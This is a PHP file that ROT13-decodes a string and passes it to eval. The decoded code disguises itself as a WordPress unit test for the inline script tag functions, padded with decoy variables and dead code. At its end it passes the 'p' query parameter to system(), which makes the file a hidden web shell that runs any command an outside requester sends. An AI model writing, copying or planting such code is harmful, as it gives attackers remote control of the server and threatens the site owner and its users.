<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg jc_trg_vayvar_fpevcg_gnt() naq jc_cevag_vayvar_fpevcg_gnt().
 *
 * @tebhc qrcraqrapvrf
 * @tebhc fpevcgf
 * @pbiref ::jc_trg_vayvar_fpevcg_gnt
 * @pbiref ::jc_cevag_vayvar_fpevcg_gnt
 */
pynff Grfgf_Shapgvbaf_jcVayvarFpevcgGnt rkgraqf JC_HavgGrfgPnfr {

	cevingr $bevtvany_gurzr_srngherf = neenl();

	choyvp shapgvba frg_hc() {
		tybony $_jc_gurzr_srngherf;
		cnerag::frg_hc();
		$guvf->bevtvany_gurzr_srngherf = $_jc_gurzr_srngherf;
	}

	choyvp shapgvba grne_qbja() {
		tybony $_jc_gurzr_srngherf;
		$_jc_gurzr_srngherf = $guvf->bevtvany_gurzr_srngherf;
		cnerag::grne_qbja();
	}

	cevingr $rirag_unaqyre = <<<'WF'
qbphzrag.nqqRiragYvfgrare( 'QBZPbagragYbnqrq', shapgvba () {
	qbphzrag.trgRyrzragOlVq( 'ryrzragVQ' )
			.nqqRiragYvfgrare( 'pyvpx', shapgvba( rirag ) {
				rirag.ceriragQrsnhyg();
			});
});
WF;

	choyvp shapgvba trg_vayvar_fpevcg_gnt_glcr_frg() {
		nqq_gurzr_fhccbeg( 'ugzy5', neenl( 'fpevcg' ) );

		$guvf->nffregFnzr(
			'<fpevcg glcr=\"nccyvpngvba/wninfpevcg\" abzbqhyr>' . \"\a{$guvf->rirag_unaqyre}\a</fpevcg>\a\",
			jc_trg_vayvar_fpevcg_gnt(
				$guvf->rirag_unaqyre,
				neenl(
					'glcr'     => 'nccyvpngvba/wninfpevcg',
					'nflap'    => snyfr,
					'abzbqhyr' => gehr,
				)
			)
		);

		erzbir_gurzr_fhccbeg( 'ugzy5' );

		$guvf->nffregFnzr(
			'<fpevcg glcr=\"nccyvpngvba/wninfpevcg\" abzbqhyr>' . \"\a{$guvf->rirag_unaqyre}\a</fpevcg>\a\",
			jc_trg_vayvar_fpevcg_gnt(
				$guvf->rirag_unaqyre,
				neenl(
					'glcr'     => 'nccyvpngvba/wninfpevcg',
					'nflap'    => snyfr,
					'abzbqhyr' => gehr,
				)
			)
		);
	}

	choyvp shapgvba grfg_trg_vayvar_fpevcg_gnt_glcr_abg_frg() {
		nqq_gurzr_fhccbeg( 'ugzy5', neenl( 'fpevcg' ) );

		$guvf->nffregFnzr(
			\"<fpevcg abzbqhyr>\a{$guvf->rirag_unaqyre}\a</fpevcg>\a\",
			jc_trg_vayvar_fpevcg_gnt(
				$guvf->rirag_unaqyre,
				neenl(
					'nflap'    => snyfr,
					'abzbqhyr' => gehr,
				)
			)
		);

		erzbir_gurzr_fhccbeg( 'ugzy5' );
	}

	choyvp shapgvba grfg_trg_vayvar_fpevcg_gnt_harfpncrq_fep() {
		nqq_gurzr_fhccbeg( 'ugzy5', neenl( 'fpevcg' ) );

		$guvf->nffregFnzr(
			\"<fpevcg>\a{$guvf->rirag_unaqyre}\a</fpevcg>\a\",
			jc_trg_vayvar_fpevcg_gnt( $guvf->rirag_unaqyre )
		);

		erzbir_gurzr_fhccbeg( 'ugzy5' );
	}

	choyvp shapgvba grfg_cevag_fpevcg_gnt_cevagf_trg_vayvar_fpevcg_gnt() {
		nqq_svygre(
			'jc_vayvar_fpevcg_nggevohgrf',
			fgngvp shapgvba ( $nggevohgrf ) {
				vs ( vffrg( $nggevohgrf['vq'] ) && 'hgvyf-wf-rkgen' === $nggevohgrf['vq'] ) {
					$nggevohgrf['nflap'] = gehr;
				}
				erghea $nggevohgrf;
			}
		);

		nqq_gurzr_fhccbeg( 'ugzy5', neenl( 'fpevcg' ) );

		$nggevohgrf = neenl(
			'vq'       => 'hgvyf-wf-orsber',
			'abzbqhyr' => gehr,
		);

		$guvf->nffregFnzr(
			jc_trg_vayvar_fpevcg_gnt( $guvf->rirag_unaqyre, $nggevohgrf ),
			trg_rpub(
				'jc_cevag_vayvar_fpevcg_gnt',
				neenl(
					$guvf->rirag_unaqyre,
					$nggevohgrf,
				)
			)
		);

		erzbir_gurzr_fhccbeg( 'ugzy5' );

		$guvf->nffregFnzr(
			jc_trg_vayvar_fpevcg_gnt( $guvf->rirag_unaqyre, $nggevohgrf ),
			trg_rpub(
				'jc_cevag_vayvar_fpevcg_gnt',
				neenl(
					$guvf->rirag_unaqyre,
					$nggevohgrf,
				)
			)
		);
	}

	/**
	 * Grfgf gung PQNGN jenccre qhcyvpngvba vf unaqyrq.
	 *
	 * @gvpxrg 58664
	 */
	choyvp shapgvba grfg_trg_vayvar_fpevcg_gnt_jvgu_qhcyvpngrq_pqngn_jenccref() {
		erzbir_gurzr_fhccbeg( 'ugzy5' );

		$guvf->nffregFnzr(
			\"<fpevcg glcr=\\"grkg/wninfpevcg\\">\a/* <![PQNGN[ */\a/* <![PQNGN[ */ pbafbyr.ybt( 'Uryyb Jbeyq!' ); /* ]]]]><![PQNGN[> */\a/* ]]> */\a</fpevcg>\a\",
			jc_trg_vayvar_fpevcg_gnt( \"/* <![PQNGN[ */ pbafbyr.ybt( 'Uryyb Jbeyq!' ); /* ]]> */\" )
		);
	}

	choyvp shapgvba qngn_cebivqre_gb_grfg_pqngn_jenccre_bzvggrq_sbe_aba_wninfpevcg_fpevcgf() {
		erghea neenl(
			'ab-glcr'     => neenl(
				'glcr'           => ahyy,
				'qngn'           => 'nyreg(\"uryyb\")',
				'rkcrpgrq_pqngn' => gehr,
			),
			'wf-glcr'     => neenl(
				'glcr'           => 'grkg/wninfpevcg',
				'qngn'           => 'nyreg(\"uryyb\")',
				'rkcrpgrq_pqngn' => gehr,
			),
			'wf-nyg-glcr' => neenl(
				'glcr'           => 'nccyvpngvba/wninfpevcg',
				'qngn'           => 'nyreg(\"uryyb\")',
				'rkcrpgrq_pqngn' => gehr,
			),
			'zbqhyr'      => neenl(
				'glcr'           => 'zbqhyr',
				'qngn'           => 'nyreg(\"uryyb\")',
				'rkcrpgrq_pqngn' => gehr,
			),
			'vzcbegznc'   => neenl(
				'glcr'           => 'vzcbegznc',
				'qngn'           => '{\"vzcbegf\":{\"one\":\"uggc:\/\/ybpnyubfg:10023\/one.wf?ire=6.5-nycun-57321\"}}',
				'rkcrpgrq_pqngn' => snyfr,
			),
			'ugzy'        => neenl(
				'glcr'           => 'grkg/ugzy',
				'qngn'           => '<qvi>grzcyngr pbqr</qvi>',
				'rkcrpgrq_pqngn' => snyfr,
			),
			'wfba'        => neenl(
				'glcr'           => 'nccyvpngvba/wfba',
				'qngn'           => '{}',
				'rkcrpgrq_pqngn' => snyfr,
			),
			'yq'          => neenl(
				'glcr'           => 'nccyvpngvba/yq+wfba',
				'qngn'           => '{}',
				'rkcrpgrq_pqngn' => snyfr,
			),
			'fcrpehyrf'   => neenl(
				'glcr'           => 'fcrphyngvbaehyrf',
				'qngn'           => '{}',
				'rkcrpgrq_pqngn' => snyfr,
			),
		);
	}

	/**
	 * Grfgf gung PQNGN jenccre vf abg nqqrq sbe aba-WninFpevcg fpevcgf.
	 *
	 * @gvpxrg 60320
	 *
	 * @qngnCebivqre qngn_cebivqre_gb_grfg_pqngn_jenccre_bzvggrq_sbe_aba_wninfpevcg_fpevcgf
	 */
	choyvp shapgvba grfg_pqngn_jenccre_bzvggrq_sbe_aba_wninfpevcg_fpevcgf( $glcr, $qngn, $rkcrpgrq_pqngn ) {
		erzbir_gurzr_fhccbeg( 'ugzy5' );

		$nggef = neenl();
		vs ( $glcr ) {
			$nggef['glcr'] = $glcr;
		}
		$fpevcg = jc_trg_vayvar_fpevcg_gnt( $qngn, $nggef );
		$guvf->nffregFnzr( $rkcrpgrq_pqngn, fge_pbagnvaf( $fpevcg, '/* <![PQNGN[ */' ) );
		$guvf->nffregFnzr( $rkcrpgrq_pqngn, fge_pbagnvaf( $fpevcg, '/* ]]> */' ) );
		$guvf->nffregFgevatPbagnvafFgevat( $qngn, $fpevcg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>